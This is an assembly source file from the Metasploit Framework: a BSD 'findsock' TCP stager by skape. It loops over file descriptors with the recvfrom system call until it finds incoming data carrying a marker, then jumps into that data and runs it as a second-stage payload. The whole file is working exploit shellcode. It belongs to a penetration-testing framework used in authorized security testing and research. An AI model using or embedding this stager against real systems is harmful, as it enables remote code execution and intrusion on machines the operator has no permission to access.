;;
; 
;        Name: stager_sock_find
;   Qualities: Nothing Special
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSD findsock TCP stager.
;
;        File descriptor in edi
;
;;
BITS   32
GLOBAL main

main:

initialize_stack:
	xor  edx, edx
	push edx
	mov  esi, esp
	push edx
	push edx
	mov  dl, 0x80
	push edx
	mov  dh, 0x0c
	push edx
	push esi
	push edx
	push edx

recvfrom:
	inc  word [esi - 0x18]
	push byte 29
	pop  eax
	int  0x80
	cmp  dword [esi], 0x2166736d
	jnz  recvfrom
	cld
	lodsd
	pop  edx
	pop  edx
%ifdef FD_REG_EBX
	pop  ebx
%else
	pop  edi
%endif
	jmp  esi
